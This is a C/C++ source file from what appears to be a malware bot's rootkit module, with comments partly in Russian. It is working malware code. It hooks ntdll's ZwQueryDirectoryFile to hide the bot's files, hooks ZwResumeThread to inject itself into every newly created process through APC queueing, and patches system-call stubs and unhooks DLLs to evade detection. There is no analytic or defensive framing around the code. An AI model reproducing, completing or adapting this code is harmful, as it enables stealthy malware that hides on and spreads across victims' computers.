#include <windows.h>

#include "GetApi.h"
#include "DllLoader.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "BotUtils.h"
#include "Splice.h"
#include "Inject.h"
#include "Rootkit.h"
#include "Unhook.h"
#include "ntdll.h"
#include "BotEvents.h"


#include "Modules.h"



DWORD dwAddrDirProc; // ZwQueryDirectoryFile hook
DWORD dwAddrRthProc; // ZwResumeThread hook
DWORD dwAddrOpfProc; // ZwOpenFile hook
DWORD dwAddrCrfProc; // ZwCreateFile hook


typedef NTSTATUS ( WINAPI *PZwQueryDirectoryFile )( HANDLE  FileHandle, HANDLE  Event,
							   PIO_APC_ROUTINE  ApcRoutine, PVOID  ApcContext,
							   PIO_STATUS_BLOCK  IoStatusBlock, PVOID  FileInformation,
							   ULONG  Length, FILE_INFORMATION_CLASS  FileInformationClass,
							   BOOLEAN  ReturnSingleEntry, PUNICODE_STRING  FileName,
							   BOOLEAN  RestartScan  );


PZwQueryDirectoryFile ZwQueryDirectoryFileReal;

NTSTATUS WINAPI ZwQueryDirectoryFileHook(  HANDLE  FileHandle, HANDLE  Event,
										   PIO_APC_ROUTINE  ApcRoutine, PVOID  ApcContext,
										   PIO_STATUS_BLOCK  IoStatusBlock, PVOID  FileInformation,
										   ULONG  Length, FILE_INFORMATION_CLASS  FileInformationClass,
										   BOOLEAN  ReturnSingleEntry, PUNICODE_STRING  FileName,
										   BOOLEAN  RestartScan  )
{
	PFILE_DIRECTORY_INFORMATION LastFileDirectoryInfo;
	PFILE_DIRECTORY_INFORMATION FileDirectoryInfo;

	PFILE_FULL_DIR_INFORMATION LastFileFullDirectoryInfo;
	PFILE_FULL_DIR_INFORMATION FileFullDirectoryInfo;

	PFILE_BOTH_DIR_INFORMATION LastFileBothDirectoryInfo;
	PFILE_BOTH_DIR_INFORMATION FileBothDirectoryInfo;

	PFILE_NAME_INFORMATION LastFileNamesInfo;
	PFILE_NAME_INFORMATION FileNamesInfo;
	
	PFILE_ID_BOTH_DIR_INFORMATION LastFileIdBothDirInfo;
	PFILE_ID_BOTH_DIR_INFORMATION FileIdBothDirInfo;

	NTSTATUS Status = ZwQueryDirectoryFileReal( FileHandle, Event, ApcRoutine, ApcContext,
												IoStatusBlock, FileInformation, Length,
												FileInformationClass, ReturnSingleEntry,
												FileName, RestartScan );
	
	if ( Status != STATUS_SUCCESS )
	{
		return Status;
	}

	DWORD dwOffset = 0;
	DWORD dwPr	   = 0;

	switch ( FileInformationClass )
	{
		case FileDirectoryInformation:
			
			FileDirectoryInfo = NULL;

			do
			{
				if ( !dwPr )
				{
					LastFileDirectoryInfo = FileDirectoryInfo;
				}

				FileDirectoryInfo = (PFILE_DIRECTORY_INFORMATION)( (DWORD)FileInformation + dwOffset );

				if ( IsHideFile( FileDirectoryInfo->FileName, FileDirectoryInfo->FileNameLength ) )
				{
					if ( !FileDirectoryInfo->NextEntryOffset )
					{
						if ( LastFileDirectoryInfo != NULL )
						{
							LastFileDirectoryInfo->NextEntryOffset = 0;
						}
						else
						{
							Status = STATUS_NO_SUCH_FILE;
						}
					}
					else if ( LastFileDirectoryInfo != NULL )
					{
						LastFileDirectoryInfo->NextEntryOffset += FileDirectoryInfo->NextEntryOffset;
						dwPr = 1;
					}
				}
				else
				{
					dwPr = 0;
				}

				dwOffset += FileDirectoryInfo->NextEntryOffset;
			}
			while ( FileDirectoryInfo->NextEntryOffset != 0 );
		break;

		case FileFullDirectoryInformation:

			FileFullDirectoryInfo = NULL;

			do
			{
				if ( !dwPr )
				{
					LastFileFullDirectoryInfo = FileFullDirectoryInfo;
				}

				FileFullDirectoryInfo = (PFILE_FULL_DIR_INFORMATION)( (DWORD)FileInformation + dwOffset );

				if ( IsHideFile( FileFullDirectoryInfo->FileName, FileFullDirectoryInfo->FileNameLength ) )
				{
					if ( !FileFullDirectoryInfo->NextEntryOffset )
					{
						if ( LastFileFullDirectoryInfo != NULL )
						{
							LastFileFullDirectoryInfo->NextEntryOffset = 0;
						}
						else
						{
							Status = STATUS_NO_SUCH_FILE;
						}
					}
					else if ( LastFileFullDirectoryInfo != NULL )
					{
						LastFileFullDirectoryInfo->NextEntryOffset += FileFullDirectoryInfo->NextEntryOffset;
						dwPr = 1;
					}
				}
				else
				{
					dwPr = 0;
				}

				dwOffset += FileFullDirectoryInfo->NextEntryOffset;
			}
			while ( FileFullDirectoryInfo->NextEntryOffset != 0 );
		break;

		case FileBothDirectoryInformation:

			FileBothDirectoryInfo = NULL;

			do
			{
				if ( !dwPr )
				{
					LastFileBothDirectoryInfo = FileBothDirectoryInfo;
				}

				FileBothDirectoryInfo = (PFILE_BOTH_DIR_INFORMATION)( (DWORD)FileInformation + dwOffset );

				if ( IsHideFile( FileBothDirectoryInfo->FileName, FileBothDirectoryInfo->FileNameLength ) )
				{
					if ( !FileBothDirectoryInfo->NextEntryOffset )
					{
						if ( LastFileBothDirectoryInfo != NULL )
						{
							LastFileBothDirectoryInfo->NextEntryOffset = 0;
						}
						else
						{
							Status = STATUS_NO_SUCH_FILE;
						}
					}
					else if ( LastFileBothDirectoryInfo != NULL )
					{
						LastFileBothDirectoryInfo->NextEntryOffset += FileBothDirectoryInfo->NextEntryOffset;
						dwPr = 1;
					}
				}
				else
				{
					dwPr = 0;
				}

				dwOffset += FileBothDirectoryInfo->NextEntryOffset;
			}
			while ( FileBothDirectoryInfo->NextEntryOffset != 0 );
		break;

		case FileNamesInformation:

			FileNamesInfo = NULL;

			do
			{
				if ( !dwPr )
				{
					LastFileNamesInfo = FileNamesInfo;
				}

				FileNamesInfo = (PFILE_NAME_INFORMATION)( (DWORD)FileInformation + dwOffset );

				if ( IsHideFile( FileNamesInfo->FileName, FileNamesInfo->FileNameLength ) )
				{
					if ( !FileNamesInfo->NextEntryOffset )
					{
						if ( LastFileNamesInfo != NULL )
						{
							LastFileNamesInfo->NextEntryOffset = 0;
						}
						else
						{
							Status = STATUS_NO_SUCH_FILE;
						}
					}
					else if ( LastFileNamesInfo != NULL )
					{
						LastFileNamesInfo->NextEntryOffset += FileNamesInfo->NextEntryOffset;
						dwPr = 1;
					}
				}
				else
				{
					dwPr = 0;
				}

				dwOffset += FileNamesInfo->NextEntryOffset;
			}
			while ( FileNamesInfo->NextEntryOffset != 0 );
		break;

		case FileIdBothDirectoryInformation:
			
			FileIdBothDirInfo = NULL;

			do
			{
				if ( !dwPr )
				{
					LastFileIdBothDirInfo = FileIdBothDirInfo ;
				}

				FileIdBothDirInfo  = (PFILE_ID_BOTH_DIR_INFORMATION)( (DWORD)FileInformation + dwOffset );

				if ( IsHideFile( FileIdBothDirInfo->FileName, FileIdBothDirInfo->FileNameLength ) )
				{
					if ( !FileIdBothDirInfo->NextEntryOffset )
					{
						if ( LastFileIdBothDirInfo  != NULL )
						{
							LastFileIdBothDirInfo->NextEntryOffset = 0;
						}
						else
						{
							Status = STATUS_NO_SUCH_FILE;
						}
					}
					else if ( LastFileIdBothDirInfo  != NULL )
					{
						LastFileIdBothDirInfo->NextEntryOffset += FileIdBothDirInfo->NextEntryOffset;
						dwPr = 1;
					}
				}
				else
				{
					dwPr = 0;
				}

				dwOffset += FileIdBothDirInfo->NextEntryOffset;
			}
			while ( FileIdBothDirInfo->NextEntryOffset != 0 );
		break;

		default:
		break;
	}

	return Status;

}

__declspec( naked ) void JmpToHookDirProc()
{
	__asm
	{
		pop eax
		lea eax,ZwQueryDirectoryFileHook
		jmp eax
		retn
	}
}

void ProtectPage( LPVOID lpAddr, DWORD dwParams )
{
	DWORD dwOldProt = 0;
	pVirtualProtectEx( (HANDLE)-1, lpAddr, 1024, dwParams, &dwOldProt );
}

void HookZwQueryDirectoryFile()
{
	dwAddrDirProc = (DWORD)&JmpToHookDirProc;
	DWORD dwAddr  = (DWORD)&dwAddrDirProc;

	PZwQueryDirectoryFile ZwQueryDirectoryFile = (PZwQueryDirectoryFile)GetProcAddressEx( NULL, 5, 0x5F8B35D6 );
	
	LPVOID lpMem;
	LPVOID lpPtr;

	lpPtr = (LPVOID)ZwQueryDirectoryFile;

	if ( lpPtr == NULL )
	{
		return;
	}

	ProtectPage( lpPtr, PAGE_EXECUTE_READWRITE );

	lpMem = pVirtualAllocEx( (HANDLE)-1, NULL, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	if ( lpMem == NULL )
	{
		return;
	}

	ZwQueryDirectoryFileReal =  (PZwQueryDirectoryFile)lpMem;

	m_memcpy( lpMem, lpPtr, 15 );

	lpPtr = (LPVOID)((DWORD)lpPtr + 5 );

	if ( *(BYTE*)lpPtr == 0xBA ) // win xp and up
	{
		lpPtr = (LPVOID)((DWORD)lpPtr + 1 );
		m_memcpy( lpPtr, &dwAddr, 4 );
	}
	else
	{
		if ( *(BYTE*)lpPtr == 0x8D ) //win2000
		{
			*(BYTE*)lpPtr = 0x68;
			dwAddr		  = (DWORD)&ZwQueryDirectoryFileHook;
			lpPtr		  = (LPVOID)((DWORD)lpPtr + 1 );

			m_memcpy( lpPtr, &dwAddr, 4 );

			lpPtr		  = (LPVOID)((DWORD)lpPtr + 6 );
		
			*(BYTE*)lpPtr = 0x00;
		}
		else
		{
			MemFree( lpMem );
		}
	}

	ProtectPage( ZwQueryDirectoryFile, PAGE_EXECUTE_READ );

	return;
}

typedef NTSTATUS ( WINAPI *PZwResumeThread )( HANDLE hThread, PULONG PreviousSuspendCount );
PZwResumeThread ZwResumeThreadReal;


DWORD GetPidByThread(HANDLE hThread )
{
	THREAD_BASIC_INFORMATION Threads;
	DWORD dwReturnLen;

	if ( pZwQueryInformationThread( hThread, ThreadBasicInformation, &Threads, sizeof( THREAD_BASIC_INFORMATION ), &dwReturnLen ) == STATUS_SUCCESS )
		return (DWORD)Threads.ClientId.UniqueProcess;

	return -1;
}


VOID NTAPI RootkitThread(	PVOID NormalContext , PVOID SystemArgument1 ,  PVOID SystemArgument2  )
{
    // Поток работает в заинжекченном процессе
	UnhookDlls();

	HookZwResumeThread();	
	HookZwQueryDirectoryFile();

	// Подготавливаем данные для события
	TEventData Data;
	ClearStruct(Data);

	// Определяем имя приложения
	PCHAR AppName = STR::Alloc(MAX_PATH);
	if (AppName != NULL && pGetModuleFileNameA(NULL, AppName, MAX_PATH))
		Data.Application = AppName;

	// HANDLE Thread = pGetCurrentThread();
	// DWORD H = GetPidByThread(Thread);

	ApplicationStarted(&Data);

	STR::Free(AppName);

	return ;
}


LPDWORD dwHashPid;
DWORD dwPidCount;

void AddPid( DWORD dwPid )
{
	if ( dwHashPid == NULL )
	{
		if ( ( dwHashPid = (LPDWORD)MemAlloc( sizeof( LPDWORD ) ) ) == NULL )
		{
			return;
		}
	}
	else
	{
		LPDWORD p = (LPDWORD)MemRealloc( dwHashPid, GetMemSize( dwHashPid ) + ( sizeof( LPDWORD ) * ( dwPidCount + 1 ) ) );

		if ( p == NULL )
		{
			return;
		}

		dwHashPid = p;
	}

	dwHashPid[ dwPidCount ] = dwPid;
	dwPidCount++;

	return;
}

bool FindPid( DWORD dwPid )
{
	for ( DWORD i = 0; i < dwPidCount; i++ )
	{
		if ( dwHashPid[i] == dwPid )
		{
			return true;
		}
	}

	return false;
}


NTSTATUS WINAPI ZwResumeThreadHook( HANDLE hThread, PULONG PreviousSuspendCount )
{
	DWORD dwPid = GetPidByThread( hThread );

	if ( dwPid != -1 && dwPid != (DWORD)pGetCurrentProcessId() )
	{
		if ( !FindPid( dwPid ) )
		{
			OBJECT_ATTRIBUTES ObjectAttributes = { sizeof( ObjectAttributes ), 0 } ;
			CLIENT_ID ClientID;

			ClientID.UniqueProcess = (HANDLE)dwPid;
			ClientID.UniqueThread  = 0;

			HANDLE hProcess = NULL;
			
			if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) == STATUS_SUCCESS )
			{
				DWORD dwAddr = InjectCode( hProcess, (LPTHREAD_START_ROUTINE) RootkitThread );	//	так делать можно, так как это только получения

				if ( dwAddr != -1 )
				{
					if ( (NTSTATUS)pZwQueueApcThread(hThread, dwAddr, NULL, NULL, NULL ) == STATUS_SUCCESS )	//	А тут делаем инжект через АРС 
						AddPid( dwPid );
				}

				pZwClose( hProcess );
			}		
		}
	}

	return ZwResumeThreadReal( hThread, PreviousSuspendCount );
}

__declspec( naked ) void JmpToHookRthProc()
{
	__asm
	{
		pop eax
		lea eax,ZwResumeThreadHook
		jmp eax
		retn
	}
}

void HookZwResumeThread()
{
	dwHashPid  = NULL;
	dwPidCount = 0;

	dwAddrRthProc = (DWORD)&JmpToHookRthProc;
	DWORD dwAddr  = (DWORD)&dwAddrRthProc;

	PZwResumeThread ZwResumeThread = (PZwResumeThread)GetProcAddressEx( NULL, 5, 0xACF8BF39 );
	
	LPVOID lpMem;
	LPVOID lpPtr;

	lpPtr = (LPVOID)ZwResumeThread;

	ProtectPage( lpPtr, PAGE_EXECUTE_READWRITE );

	lpMem = pVirtualAllocEx( (HANDLE)-1, NULL, 1024, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	if ( lpMem == NULL )
	{
		return;
	}

	ZwResumeThreadReal =  (PZwResumeThread)lpMem;

	m_memcpy( lpMem, lpPtr, 15 );

	lpPtr = (LPVOID)((DWORD)lpPtr + 5 );

	if ( *(BYTE*)lpPtr == 0xBA ) // win xp and up
	{
		lpPtr = (LPVOID)((DWORD)lpPtr + 1 );
		m_memcpy( lpPtr, &dwAddr, 4 );
	}
	else
	{
		if ( *(BYTE*)lpPtr == 0x8D ) //win2000
		{
			*(BYTE*)lpPtr = 0x68;
			dwAddr		  = (DWORD)&ZwResumeThreadHook;
			lpPtr		  = (LPVOID)((DWORD)lpPtr + 1 );

			m_memcpy( lpPtr, &dwAddr, 4 );

			lpPtr		  = (LPVOID)((DWORD)lpPtr + 6 );

		
			*(BYTE*)lpPtr = 0x00;
		}
		else
		{
			MemFree( lpMem );
		}
	}

	ProtectPage( ZwResumeThread, PAGE_EXECUTE_READ );

	return;
}







